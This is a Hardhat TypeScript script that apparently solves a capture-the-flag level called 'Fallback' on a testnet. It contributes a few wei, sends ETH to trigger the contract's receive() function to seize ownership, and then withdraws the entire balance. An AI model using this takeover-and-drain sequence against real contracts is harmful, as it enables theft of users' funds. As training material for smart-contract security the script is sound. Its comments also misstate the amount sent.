import { ethers } from "hardhat";

/**
 * Script to solve the Level 1: Fallback challenge
 * This script exploits the vulnerability in the Fallback contract
 * to take ownership and drain the contract's funds
 * 
 * Usage: 
 * npx hardhat run scripts/level-01-fallback/solve-fallback.ts --network sepolia
 * CONTRACT_ADDRESS=0xYourAddress npx hardhat run scripts/level-01-fallback/solve-fallback.ts --network sepolia
 */
async function main() {
  // Get the contract address from environment variable or use default
  const defaultAddress = "0x946D0852932CFCA49879d3490bA90bfa417B6319";
  const contractAddress = process.env.CONTRACT_ADDRESS || defaultAddress;
  
  console.log(`Connecting to Fallback contract at address: ${contractAddress}`);
  
  // Get the contract factory and attach to the deployed contract
  const Fallback = await ethers.getContractFactory("Fallback");
  const fallback = Fallback.attach(contractAddress);
  
  // Get signers (we'll use the first one as our attacker)
  const [attacker] = await ethers.getSigners();
  console.log(`Attacker address: ${attacker.address}`);
  
  try {
    // Step 1: Check initial state
    console.log("\n--- Initial State ---");
    const initialOwner = await fallback.owner();
    console.log(`Current owner: ${initialOwner}`);
    
    let contribution = await fallback.getContribution();
    console.log(`Our contribution: ${ethers.formatEther(contribution)} ETH`);
    
    const contractBalance = await ethers.provider.getBalance(contractAddress);
    console.log(`Contract balance: ${ethers.formatEther(contractBalance)} ETH`);
    
    // Step 2: Make a small contribution to satisfy the receive() function requirement
    console.log("\n--- Step 1: Making a small contribution ---");
    const contributeTx = await fallback.contribute({ value: ethers.parseEther("0.0000000000000001") }); // 10 wei
    await contributeTx.wait();
    console.log("Contribution transaction successful!");
    
    // Check our contribution after the transaction
    contribution = await fallback.getContribution();
    console.log(`Our contribution now: ${ethers.formatEther(contribution)} ETH`);
    
    // Step 3: Send ETH directly to the contract to trigger the receive() function
    console.log("\n--- Step 2: Sending ETH to trigger receive() function ---");
    const sendTx = await attacker.sendTransaction({
      to: contractAddress,
      value: ethers.parseEther("0.0000000000000001") // 10 wei
    });
    await sendTx.wait();
    console.log("ETH sent successfully!");
    
    // Step 4: Check if we became the owner
    console.log("\n--- Step 3: Checking ownership ---");
    const newOwner = await fallback.owner();
    console.log(`New owner: ${newOwner}`);
    
    if (newOwner === attacker.address) {
      console.log("✅ Ownership successfully taken!");
    } else {
      console.log("❌ Failed to take ownership.");
      return;
    }
    
    // Step 5: Check contract balance before withdrawal
    const balanceBeforeWithdraw = await ethers.provider.getBalance(contractAddress);
    console.log(`\nContract balance before withdrawal: ${ethers.formatEther(balanceBeforeWithdraw)} ETH`);
    
    // Step 6: Withdraw all funds
    console.log("\n--- Step 4: Withdrawing all funds ---");
    const withdrawTx = await fallback.withdraw();
    await withdrawTx.wait();
    console.log("Withdrawal transaction successful!");
    
    // Step 7: Check contract balance after withdrawal
    const balanceAfterWithdraw = await ethers.provider.getBalance(contractAddress);
    console.log(`Contract balance after withdrawal: ${ethers.formatEther(balanceAfterWithdraw)} ETH`);
    
    if (balanceAfterWithdraw==0n) {
      console.log("\n🎉 Congratulations! You've completed the Fallback challenge! 🎉");
    } else {
      console.log("\n❌ Something went wrong. The contract still has funds.");
    }
    
  } catch (error) {
    console.error("Error solving the Fallback challenge:", error);
  }
}

// Execute the main function and handle any errors
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
